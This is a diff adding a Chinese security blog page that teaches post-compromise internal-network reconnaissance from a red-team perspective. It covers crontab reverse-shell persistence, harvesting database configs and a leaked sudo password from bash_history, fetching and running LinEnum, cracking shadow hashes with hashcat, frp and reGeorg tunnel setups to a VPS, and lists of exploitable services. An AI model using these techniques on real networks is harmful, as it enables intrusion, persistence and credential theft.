@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8">
+<!--dev siwtch-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='apple-mobile-web-app-capable' content='yes'/>
+<meta name='full-screen' content='true'/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--dev switch end-->
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="「信息搜集」:漫谈一些在内网的信息搜集技巧 | © 哨兵" />
+<meta property="og:description" content="本站由哨兵安全实验室支持创办" />
+<meta property="og:image" content="https://bin4xin.sentrylab.cn/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="https://bin4xin.sentrylab.cn/blog/2020/walkthrough/insideNet/" />
+<title> 「信息搜集」:漫谈一些在内网的信息搜集技巧 | © 哨兵 | Sentry CyberSecurity</title>
+
+<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
+<script src="/assets/js/pace.min.js"></script>
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+<!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+
+<!--mathjax-config scripts.-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+</script>
+<script src="/assets/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!--mathjax-config scripts stop.-->
+
+
+
+</head>
+
+
+    <body>
+
+        <!--
+#####################################################################################################################
+|  1.Fixed navbar issues #3 visit https://github.com/Bin4xin/bin4xin.github.io/issues/3                             |
+|    change `position: fixed` to `position: sticky`                                                                 |
+|                                                                                                                   |
+|  2.Fixed navbar padding-top equals to 70px                                                                        |
+|    `./assets/css/style.scss` @import struture in `./assets/css/_struture.scss` del `padding-top=70px` in body.    |
+#####################################################################################################################-->
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+<!-- 代码引用申明/code reference declaration:
+@ [click this icon -> scroll to top of page;] code from anquanke. visit any posts in https://www.anquanke.com/
+<del>also this icon func are under-construction</del>
+DONE.
+-->
+            <a class="navbar-brand back-to-top" style="cursor: pointer" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 1000);">
+                <picture>
+  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
+  
+  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
+  </picture>
+            </a>
+        </div>
+        <div class="navbar-collapse collapse navbar-right">
+            <ul class="nav navbar-nav">
+                
+                <li ><a href="/">HOME</a></li>
+                <li class="active"><a href="/blog/">BLOG</a></li>
+                <li ><a href="/categories/">CATEGORIES</a></li>
+                <li ><a href="/daily/">DAILY</a></li>
+                <li ><a href="/about/">ABOUT</a></li>
+                <li ><a href="/feed.xml">RSS</a></li>
+                <li ><a href="/usage/">QUICK START</a></li>
+                
+            </ul>
+        </div><!--/.nav-collapse -->
+    </div>
+</div>
+
+            <div class="container mtb">
+    <div class="row">
+        <!-- SINGLE POST -->
+        <div class="col-lg-8 markdown-body-img">
+            <!-- Blog Post  -->
+            <a href="/blog/2020/walkthrough/insideNet/"><h1 class="ctitle">「信息搜集」:漫谈一些在内网的信息搜集技巧</h1></a>
+            <p><csmall>
+              2020-06-08发布. | 
+               并最后修改于：2021-03-19 | 
+               By: Bin4xin.
+            </csmall></p>
+            <div class="post-content"> 
+            <p>经历过几次HW行动，每次HW都运气较好可以拿到服务器，于是每次公司的内网渗透的任务就交给我，记录一下对于内网的信息搜集过程，以及在此过程中我自己所积累的小技巧。</p>
+
+<hr />
+<p><strong>2021年 3月19日 星期五 16时37分27秒 CST</strong>更新</p>
+<ul>
+  <li>重构了部分小结的展示：
+    <ul>
+      <li>重新调整了文章的阐述框架，尽可能从实战角度出发，进行章节安排；</li>
+      <li>尽量使得前后小结更加紧凑，阐述逻辑更加清晰。</li>
+    </ul>
+  </li>
+  <li>加入了尽可能多的markdown语法，文章结构清晰的同时，让页面更加赏心悦目。</li>
+</ul>
+
+<blockquote>
+  <p>写在文前：</p>
+
+  <p>年后回来就一直在肝代码，肝的快失去信心了；正好三月中旬有场全国范围的攻防演练，就来重新拾起信心～演练结束再肝代码再失去信心，循环往复=。=</p>
+
+  <p>本文着重从实战角度作为切入点，从获取的跳板机为入口进行阐述，基本的逻辑为：</p>
+
+  <p>跳板机-&gt;内网代理-&gt;信息搜集-&gt;漏洞挖掘与利用</p>
+</blockquote>
+
+<p>我们从攻击者的角度来看，拿到一个跳板机的权限后首先是对跳板机所在的区域进行路由划分，我们可以通过这样的思路来判断获得内网中搜集到的信息是否利于我们进一步渗透，同时我们在此过程中也需要小心谨慎，攻防演练中我所遇到的基本上都是生产环境，在和开发、运维人员博弈的过程中要做到：
+<strong>悄悄地来、悄悄的走</strong></p>
+
+<p>废话不多说，文笔较菜，文章权当抛砖引玉，回到正题。</p>
+<h2 id="零在机器上的信息搜集">零：在机器上的信息搜集</h2>
+
+<blockquote>
+  <p>渗透的本质就是信息搜集</p>
+</blockquote>
+
+<h3 id="0x01个人工作机器信息搜集">0x01：个人工作机器信息搜集</h3>
+<p>这方面我本人了解的不是很多，一般来说是通过钓鱼邮件的形式获取的WINDOWS PC权限，可以参考我另一篇从网上的搬运过来的文章：</p>
+
+<ul>
+  <li><a href="https://juejin.cn/post/6881208971915444231#heading-3">个人机器信息收集</a></li>
+</ul>
+
+<h3 id="0x02web服务器信息搜集">0x02：WEB服务器信息搜集</h3>
+<p>一般建议可以以root用户新建用户来维持权限，或者是写入<code class="language-plaintext highlighter-rouge">corntab</code>计划来定时反弹shell。实操中几乎很少有运维、开发去检查定时计划的反弹shell脚本，所以基本上可以满足后持续渗透的条件。</p>
+<h4 id="-配置文件"># 配置文件</h4>
+
+<ul>
+  <li>数据库配置信息
+通过mybatis等配置文件就可以拿到内网中对应的数据库机器，一般都是低权限，运气好可以拿到高权限。运气再好一点存在高权限的mssql数据库可以尝试连接一下尝试<code class="language-plaintext highlighter-rouge">xp_cmd_shell</code>来执行命令。</li>
+</ul>
+
+<p>我们通过web层面拿到的机器，一般都是web服务器，即存在各种jar包，所以服务器里会存放大量配置文件</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>在当前目录下搜索存在字符为<span class="s1">'mysql'</span>的文件
+<span class="nb">grep</span> <span class="nt">-rn</span> <span class="s2">"mysql"</span> <span class="nb">.</span>
+<span class="o">=======</span>
+查看对应系统的敏感配置文件
+<span class="nb">cat </span>static/scripts/tinymce/js/tinymce/plugins/jbimages/ci/application/config/database.php
+<span class="o">=======</span>
+curl ifconfig.me
+120.25.13.49
+</code></pre></div></div>
+<p>通过进程任务可以查找到部署jar包的目录和相对应依赖，大部分运维和开发都习惯于在根目录下新建data目录或者是非系统文件夹下的目录存在web的依赖jar包，我们就可以从这点做突破口。查看一下端口开放情况和对应的目录位置，有一些shell的基础就可以搜集到这些信息。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps <span class="nt">-ef</span>|grep java
+
+netstat <span class="nt">-ANTUP</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>有的时候拿到的机器或多或少存在一些特殊情况，比如docker机器、单纯的一个数据库机器，那么就尽力而为去做一些搜集工作，特别是docker机器，除了跑的服务，机器里面太干净了，基本没有什么可以利用的地方。</strong></p>
+</blockquote>
+
+<h4 id="-bash_history"># bash_history</h4>
+
+<p>命令执行历史文件一般建议必看，里面会存着一些意想不到的内容，下面截取一小部分我在内网实战中发现的惊喜：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>nexus-3.12.0-01
+ll
+<span class="nb">cd </span>bin/
+./nexus start
+pactera@575
+<span class="nb">cd </span>domain/
+ll
+<span class="nb">cd </span>nexus3/
+</code></pre></div></div>
+<p>注意<code class="language-plaintext highlighter-rouge">./nexus start</code>和<code class="language-plaintext highlighter-rouge">cd domain/</code>两条命令中间的那个“命令”，对，没错那个是sudoer用户的密码，su切换直接就拥有root权限。我们分析一下为什么出现这样的现象：个人认为是在运行nexus程序是需要密码来提升权限，然后输入者在等待过程中没有发现输入密码的shell还没有回显出来就输入了密码，从而导致密码被系统当作执行命令记录进了history文件。</p>
+
+<hr />
+<p><strong>发现这个后，我第一时间去看了自己服务器和自己的mac本上的历史文件，搜索机器密码关键词，同时也存在这样的现象明文密码存在了里面</strong></p>
+
+<p><strong>醍醐灌顶</strong></p>
+<h4 id="-一些自动化搜集脚本"># 一些自动化搜集脚本</h4>
+
+<ul>
+  <li>LinEnum.sh
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-o</span> /tmp/linenum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+<span class="nb">chmod</span> +X /tmp/linenum.sh <span class="o">&amp;&amp;</span> bash /tmp/linenum.sh
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h4 id="-passwdshadow不推荐"># Passwd&amp;Shadow（不推荐）</h4>
+
+<p>一般来说通过<code class="language-plaintext highlighter-rouge">shiro</code>和<code class="language-plaintext highlighter-rouge">struts2</code>拿到的shell基本都是root，很多人都会直接去读取passwd文件，其实并不可取。下面展示一下2核4G服务器跑hash文件的过程。一般是跑不出来的，哈希不可逆，除非存在彩虹表，一般都跑不出来。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 1800 <span class="nt">-a</span> 0 <span class="nt">-o</span> found.txt linux-root.txt /usr/share/john/password.lst <span class="nt">--force</span>
+hashcat <span class="o">(</span>v4.0.1<span class="o">)</span> starting...
+
+OpenCL Platform <span class="c">#1: The pocl project</span>
+<span class="o">====================================</span>
+<span class="k">*</span> Device <span class="c">#1: pthread-Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz, 256/738 MB allocatable, 1MCU</span>
+
+Hashes: 2 digests<span class="p">;</span> 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+<span class="k">*</span> Zero-Byte
+<span class="k">*</span> Uses-64-Bit
+
+Password length minimum: 0
+Password length maximum: 256
+
+ATTENTION! Pure <span class="o">(</span>unoptimized<span class="o">)</span> OpenCL kernels selected.
+This enables cracking passwords and salts <span class="o">&gt;</span> length 32 but <span class="k">for </span>the price of drastical reduced performance.
+If you want to switch to optimized OpenCL kernels, append <span class="nt">-O</span> to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+Watchdog: Temperature retain trigger disabled.
+
+<span class="k">*</span> Device <span class="c">#1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'</span>
+<span class="k">*</span> Device <span class="c">#1: Kernel m01800.8f866878.kernel not found in cache! Building may take a while...</span>
+
+</code></pre></div></div>
+<p>继续 :(</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>r]esume <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoint <span class="o">[</span>q]uit <span class="o">=&gt;</span> Dictionary cache built:
+<span class="k">*</span> Filename..: /usr/share/john/password.lst
+<span class="k">*</span> Passwords.: 3559
+<span class="k">*</span> Bytes.....: 26325
+<span class="k">*</span> Keyspace..: 3559
+<span class="k">*</span> Runtime...: 0 secs
+
+- Device <span class="c">#1: autotuned kernel-accel to 128</span>
+- Device <span class="c">#1: autotuned kernel-loops to 128</span>
+<span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>r]esume <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoint <span class="o">[</span>q]uit <span class="o">=&gt;</span> <span class="o">[</span>s]tatus <span class="o">[</span>p]ause <span class="o">[</span>r]esume <span class="o">[</span>b]ypass <span class="o">[</span>c]heckpoApproaching final keyspace - workload adjusted.
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: sha512crypt <span class="nv">$6$,</span> SHA512 <span class="o">(</span>Unix<span class="o">)</span>
+Hash.Target......: linux-root.txt
+Time.Started.....: Mon Jun  8 11:29:25 2020 <span class="o">(</span>23 secs<span class="o">)</span>
+Time.Estimated...: Mon Jun  8 11:29:48 2020 <span class="o">(</span>0 secs<span class="o">)</span>
+Guess.Base.......: File <span class="o">(</span>/usr/share/john/password.lst<span class="o">)</span>
+Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+Speed.Dev.#1.....:      311 H/s <span class="o">(</span>8.82ms<span class="o">)</span>
+Recovered........: 0/2 <span class="o">(</span>0.00%<span class="o">)</span> Digests, 0/2 <span class="o">(</span>0.00%<span class="o">)</span> Salts
+Progress.........: 7118/7118 <span class="o">(</span>100.00%<span class="o">)</span>
+Rejected.........: 0/7118 <span class="o">(</span>0.00%<span class="o">)</span>
+Restore.Point....: 3559/3559 <span class="o">(</span>100.00%<span class="o">)</span>
+Candidates.#1....: doom2 -&gt; sss
+HWMon.Dev.#1.....: N/A
+
+Started: Mon Jun  8 11:28:50 2020
+Stopped: Mon Jun  8 11:29:49 2020
+</code></pre></div></div>
+
+<h3 id="0x03运维机器信息搜集">0x03：运维机器信息搜集</h3>
+
+<p>头脑风暴中…（没有遇到，有再更新）</p>
+<ul>
+  <li>密码复用</li>
+  <li>常见运维平台及服务的漏洞利用
+    <ul>
+      <li>zabbix agent</li>
+      <li>堡垒机</li>
+      <li>…</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="一局域网里的信息搜集">一：局域网里的信息搜集</h2>
+
+<h3 id="1x01跳板机攻击">1x01：跳板机攻击</h3>
+<p>这一小节提出的意思是：跳板机上的<code class="language-plaintext highlighter-rouge">公网暴露</code>和<code class="language-plaintext highlighter-rouge">内网暴露</code>。
+如：</p>
+<ul>
+  <li>各种数据库 mysql、oracle、postgresql仅内网开放</li>
+  <li>区别在于：<code class="language-plaintext highlighter-rouge">bind addr</code> = <code class="language-plaintext highlighter-rouge">0.0.0.0 or 127.0.0.1</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for</span> <span class="o">(</span>inside_ip_addr<span class="o">)</span>
+
+20893/tcp open  textui       Alibaba Dubbo remoting telnetd
+</code></pre></div></div>
+<p>显而易见，内网里的Dubbo，反序列化走一波。</p>
+
+<h3 id="1x02内网代理">1x02：内网代理</h3>
+
+<p>内网代理，顾名思义就是我们自己可控的本机，通过各种代理方法（s5、s4），把拿下的内网服务器当作流量转发的一个中间跳板，对内网进行一系列我们想做的事情。这种情况下，我们的代理机器在内网没有具体的一个身份，只是我们通过代理的方式把我们对内网所发出的流量通过内网可控服务器向内网进行请求。</p>
+
+<p>极力推荐。挂了代理就已经进入了内网，十分方便。只需要配置vps（frps）端，拿下shell后下载frpc客户端，启动服务就可以。下面顺便贴上server端和client端的配置文件:</p>
+
+<ul>
+  <li><strong>frp server:</strong></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>frp/frps.ini 
+<span class="o">[</span>common]
+<span class="c"># vps代理TCP监听端口</span>
+bind_port <span class="o">=</span> 7000
+
+<span class="c"># 授权码，请改成更复杂的</span>
+token <span class="o">=</span> <span class="o">{</span>your token<span class="o">}</span>
+
+<span class="c"># frp管理后台端口，请按自己需求更改</span>
+dashboard_port <span class="o">=</span> 7500
+<span class="c"># frp管理后台用户名和密码，请改成自己的</span>
+dashboard_user <span class="o">=</span> <span class="o">{</span>your admin username<span class="o">}</span>
+dashboard_pwd <span class="o">=</span> <span class="o">{</span>your admin password<span class="o">}</span>
+enable_prometheus <span class="o">=</span> <span class="nb">true</span>
+
+<span class="c"># frp日志配置</span>
+log_file <span class="o">=</span> /var/log/frps.log
+log_level <span class="o">=</span> info
+log_max_days <span class="o">=</span> 3
+
+<span class="c">#启动vps frps端</span>
+<span class="nv">$ </span>./frps <span class="nt">-c</span> frps.ini
+</code></pre></div></div>
+<ul>
+  <li><strong>frp clients（被代理客户端，可以称为跳板机）:</strong></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>s5_jsccs.ini 
+<span class="o">[</span>common]
+server_addr <span class="o">=</span> <span class="o">{</span>your vps ip<span class="o">}</span>
+server_port <span class="o">=</span> 7000
+<span class="nv">token</span><span class="o">=</span> <span class="o">{</span>your token<span class="o">}</span>
+
+<span class="c">#此处可以自定义标签-dashboard面板proxies父栏对应的name={target}，{target}示例：s5_in_JStelecom</span>
+<span class="o">[{</span>target<span class="o">}]</span>
+<span class="nb">type</span> <span class="o">=</span> tcp
+remote_port <span class="o">=</span> 10010
+plugin <span class="o">=</span> socks5
+plugin_user <span class="o">=</span> <span class="o">{</span>your connect username<span class="o">}</span>
+plugin_passwd <span class="o">=</span> <span class="o">{</span>your connect password<span class="o">}</span>
+use_encryption <span class="o">=</span> <span class="nb">true
+</span>use_compression <span class="o">=</span> <span class="nb">true</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>client（代理进内网客户端，可以称为攻击机器）</strong>
+    <ul>
+      <li>1.proxifier（支持mac、windows）配置自定义：
+        <ul>
+          <li>server_addr = {your vps ip}</li>
+          <li>server_port = 7000</li>
+          <li>plugin = socks5</li>
+          <li>plugin_user = {your connect username}</li>
+          <li>plugin_passwd = {your connect password}</li>
+        </ul>
+      </li>
+      <li>2.proxychains4 (linux、mac)配置<code class="language-plaintext highlighter-rouge">/etc/proxychains.conf</code>文件：
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">[</span>ProxyList]
+  <span class="c"># add proxy here ...</span>
+  <span class="c"># meanwile</span>
+  <span class="c"># defaults set to "tor"</span>
+  <span class="c"># socks4        127.0.0.1 9050</span>
+
+  <span class="c">#socks5 127.0.0.1 1081</span>
+  socks5  <span class="o">{</span>your vps ip<span class="o">}</span>   <span class="o">{</span>your vps port<span class="o">}</span>    <span class="o">{</span>your connect username<span class="o">}</span>   <span class="o">{</span>your connect password<span class="o">}</span>
+  <span class="c"># burp suite proxy</span>
+  <span class="c">#http 127.0.0.1 12344</span>
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>应用即可。<code class="language-plaintext highlighter-rouge">proxychains4 curl http://{target.ip}:{target.port}/</code>命令进行内网访问，一般可以通过命令行进行海德拉批量口令爆破，若需GUI进行浏览器访问可使用<code class="language-plaintext highlighter-rouge">proxifier</code>进行全局代理进行web访问。</p>
+
+<h3 id="1x03内网穿透">1x03：内网穿透</h3>
+
+<p>在写之前我们需要明确一点，就是我们所需要的内网目标是什么？
+而内网穿透和内网代理的分别在哪里？
+在什么情况我们需要做内网穿透，什么时候我们需要做内网代理？</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 reGeorgSocksProxy.py <span class="nt">-p</span> 9999 <span class="nt">-l</span> 0.0.0.0 <span class="nt">-u</span> https://www.pgyer.com/tunnel.nosocket.php
+</code></pre></div></div>
+
+<p>内网穿透就是针对一个机器下的某一个特定端口，通过流量转发的形式把端口暴露在公网上，举个例子，我们拿下了一个linux机器，很巧这个机器是运维机器，我们发现了大量的运维账号密码。
+又然后，发现windows的远程登录服务即3389端口，所以我们在这个时候可以使用端口服务转发的技巧，把端口流量转发到一个我们可控公网的端口上（如33890），那么我们在对我们自己可控公网的端口上进行数据请求的时候，就是在对这个windows机器的数据请求，所以我们可以很轻松的使用我们的到的账号和密码来连接对应的windows机器。</p>
+
+<p>所以我们做内网穿透的最终目的，很显然是：
+我们在已知某个内网服务器的敏感信息（如3389远程连接账号密码、3306连接账号密码），而我们在内网又无法使用windows机器远程连接、mysql-client软件对我们所得到的信息进行明确验证时，那么这个时候我们可以使用内网穿透即流量转发的手段来进行进一步验证。</p>
+
+<h3 id="1x04内网信息搜集技巧">1x04：内网信息搜集技巧</h3>
+<h4 id="-nmap"># nmap</h4>
+<p>由此拿到web服务器的权限后，msf死活都连不上，就无法进行内网扫描，查资料后可以：</p>
+
+<ul>
+  <li>跳板机（非root权限）本地编译安装nmap：</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://nmap.org/dist/nmap-7.40.tar.bz2
+bzip2 <span class="nt">-cd</span> nmap-7.40.tar.bz2 | <span class="nb">tar </span>xvf -
+<span class="nb">cd </span>nmap-7.40
+./configure
+<span class="nb">echo</span> <span class="nv">$?</span>
+make <span class="o">&amp;&amp;</span> make <span class="nb">install
+</span>noohup ./nmap <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-A</span> 192.168.0.0/24 &amp;
+</code></pre></div></div>
+
+<ul>
+  <li>Cobalt Strike 插件扫描</li>
+</ul>
+
+<h2 id="二典型案例剖析">二：典型案例剖析</h2>
+
+<ul>
+  <li>Elastic Search
+    <ul>
+      <li>RCE</li>
+      <li>敏感信息</li>
+      <li>nday…</li>
+    </ul>
+  </li>
+  <li>Zabbix
+    <ul>
+      <li>弱口令</li>
+      <li>SQL注入</li>
+      <li>nday…</li>
+    </ul>
+  </li>
+  <li>ActiveMQ
+    <ul>
+      <li>basic认证弱口令</li>
+      <li>ActiveMQ 反序列化漏洞（CVE-2015-5254）</li>
+      <li>PUT &amp; MOVE方法写入shell</li>
+    </ul>
+  </li>
+  <li>Hystrix
+    <ul>
+      <li>ssrf
+        <ul>
+          <li>http://ip:6855/proxy.stream?origin=http://www.baidu.com</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>redis
+    <ul>
+      <li>未授权写入crontab计划</li>
+    </ul>
+  </li>
+  <li>shiro
+    <ul>
+      <li>shiro550 &amp; 721 rememberMe反序列化</li>
+    </ul>
+  </li>
+  <li>struts2
+    <ul>
+      <li>s2-{01-61}</li>
+    </ul>
+  </li>
+  <li>…
+其实总结下来内网里有很多可以利用的，还是要具体问题具体分析才能更好的在内网“遨游”。</li>
+</ul>
+
+<h2 id="总结">总结</h2>
+
+<p><strong>总结下来，内网的信息收集需要的是细心。</strong></p>
+
+<h2 id="参考">参考</h2>
+
+<ul>
+  <li><a href="https://apt404.github.io/2016/06/26/atived-machine-discovnery/">如何在目标内网中发现更多存活主机 [Arp,icmp,tcp/udp,smb,snmp …]</a></li>
+</ul>
+
+<p>以上。</p>
+
+            </div>
+            <div class="spacing"></div>
+            
+        </div><!--/col-lg-8 -->
+    <div class="sticky limit-sticky"><script src="/assets/js/oh-sentry.js"></script>
+<div xmlns="http://www.w3.org/1999/html">
+    
+    <div class=" ml-hide hidden-print">
+        <div class="nav nav-stacked tableOfContents_35-E thin-scrollbar">
+            <h5 class="lead">文章目录</h5>
+            <li class="table-of-contents__left-border table-of-contents">
+                <code-index-css class="">
+                    <ul id="toc" class="section-nav">
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h2"><a href="#零在机器上的信息搜集">零：在机器上的信息搜集</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#0x01个人工作机器信息搜集">0x01：个人工作机器信息搜集</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#0x02web服务器信息搜集">0x02：WEB服务器信息搜集</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h4"><a href="#-配置文件"># 配置文件</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h4"><a href="#-bash_history"># bash_history</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h4"><a href="#-一些自动化搜集脚本"># 一些自动化搜集脚本</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h4"><a href="#-passwdshadow不推荐"># Passwd&amp;Shadow（不推荐）</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#0x03运维机器信息搜集">0x03：运维机器信息搜集</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h2"><a href="#一局域网里的信息搜集">一：局域网里的信息搜集</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#1x01跳板机攻击">1x01：跳板机攻击</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#1x02内网代理">1x02：内网代理</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#1x03内网穿透">1x03：内网穿透</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h3"><a href="#1x04内网信息搜集技巧">1x04：内网信息搜集技巧</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h4"><a href="#-nmap"># nmap</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h2"><a href="#二典型案例剖析">二：典型案例剖析</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h2"><a href="#总结">总结</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN toc-h2"><a href="#参考">参考</a></li>
+</ul>
+                </code-index-css>
+            </li>
+        </div>
+    </div>
+    
+    <!--notice start-->
+    
+
+    
+    
+    
+    
+    
+    <diva-Feed-xml>
+        <div class="js-notice">
+            <form class="Box-aricle position-relative rounded-2 mb-4 p-3 js-notice-dismiss overflow-hidden" style="z-index: 1" data-turbo="false">
+                <picture>
+                    <img src="https://image.yjs2635.xyz/images/2022/06/27/arnold-francisca-f77Bh3inUpE-unsplash.jpg" alt="" class="position-absolute top-0 left-0 width-full select-forbidden" style="pointer-events: none; z-index: -1; height: 100%; height: 100%; object-fit: cover;">
+                </picture>
+                <!--TODONE:
+                 !--- Done. issue 1. While click to close the <X button/div>, whole h5 page will refresh. I don't know why.
+                    -- use <span> labels instead of <button> :-D
+                 !--- Done. issue 2. By <Js function> custom_close change/add div's class to hide buttons/divs, so while have 2 or more, all will close
+                    -- see `/assets/js/oh-sentry.js`
+                 ~~;*(~~ :-D
+                -->
+                <div class="position-absolute p-2" style="top: 4px; right: 6px;">
+                    <span id="hidden-2-click-Feed-xml" aria-label="Close" type="submit" data-view-component="true" class="close-button color-fg-on-emphasis pointer">
+                    <svg aria-hidden="true"  data-view-component="true" class="octicon octicon-x" height="16" viewBox="0 0 16 16" version="1.1" width="16">
+                    <path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path>
+                    </svg></span>
+                </div>
+
+                <img src="/assets/img/svg/actions-documentation.svg" alt="Feed-xml" width="32" height="32" class="d-block select-forbidden">
+                <p class="my-3 col-7 color-fg-on-emphasis text-bold h4">
+                    将feed汇流于一处称为聚合（aggregation）
+                </p>
+
+                <div class="content">
+                    <p>
+                        <a href="/feed.xml" class="btn-primary btn btn-block" target="blank">
+                            More about Feed.xml
+                            <span class="DocsMarkdown--link-external-icon">
